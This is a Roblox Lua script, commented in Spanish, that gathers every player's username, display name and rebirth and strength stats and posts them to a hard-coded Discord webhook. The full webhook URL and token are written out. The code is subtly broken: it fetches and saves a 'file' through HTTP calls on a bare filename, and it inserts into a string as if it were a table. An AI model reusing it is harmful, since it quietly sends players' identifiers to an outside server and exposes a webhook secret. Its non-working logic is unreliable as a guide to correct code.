local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"

local sentPlayersFile = "sent_players.json" -- Nombre del archivo

-- Cargar IDs enviados
local function loadSentPlayers()
    local success, data = pcall(function()
        return HttpService:GetAsync(sentPlayersFile)
    end)
    if success then
        return HttpService:JSONDecode(data) or {}
    else
        return {}
    end
end

-- Guardar IDs enviados
local function saveSentPlayers(sentPlayers)
    local success, response = pcall(function()
        HttpService:PostAsync(sentPlayersFile, HttpService:JSONEncode(sentPlayers))
    end)
    if not success then
        warn("Error al guardar los IDs enviados:", response)
    end
end

local function formatNumber(number)
    if number < 1000 then
        return tostring(number)
    end
    local suffixes = {"", "K", "M", "B", "T", "QD"}
    local suffix_index = 1
    while math.abs(number) >= 1000 and suffix_index < #suffixes do
        number = number / 1000.0
        suffix_index = suffix_index + 1
    end
    return string.format("%.2f%s", number, suffixes[suffix_index])
end

local function getAllPlayerData()
    local playerDataList = {}
    for _, player in pairs(Players:GetPlayers()) do
        local playerData = {}
        local playerName = player.Name
        local playerDisplayName = player.DisplayName

        local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
        if folderData then
            local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
            local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0

            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s",
                playerName, playerDisplayName, formatNumber(rebirthValue), formatNumber(strengthValue))

            table.insert(playerDataList, {
                label = combinedLabel,
                rebirth = rebirthValue,
                strength = strengthValue,
                userId = player.UserId
            })
        end
    end

    return playerDataList
end

local function sendPlayerInfoToDiscord()
    local sentPlayers = loadSentPlayers()
    local allPlayerData = getAllPlayerData()

    local dataToSend = {
        ["embeds"] = {
            {
                ["description"] = "Jugadores del juego:\n",
                ["color"] = 0x00ff00,
                ["title"] = "Estadísticas de los jugadores",
            }
        }
    }

    for _, playerData in ipairs(allPlayerData) do
        if not sentPlayers[tostring(playerData.userId)] then
            table.insert(dataToSend["embeds"][1]["description"], playerData.label .. "\n")
            sentPlayers[tostring(playerData.userId)] = true -- Marcar como enviado
        end
    end

    -- Guardar IDs enviados
    saveSentPlayers(sentPlayers)

    local success, response = pcall(function()
        return HttpService:PostAsync(discordWebhookUrl, HttpService:JSONEncode(dataToSend), Enum.HttpContentType.ApplicationJson)
    end)

    if not success then
        warn("Error al enviar la información a Discord:", response)
    end
end

sendPlayerInfoToDiscord()
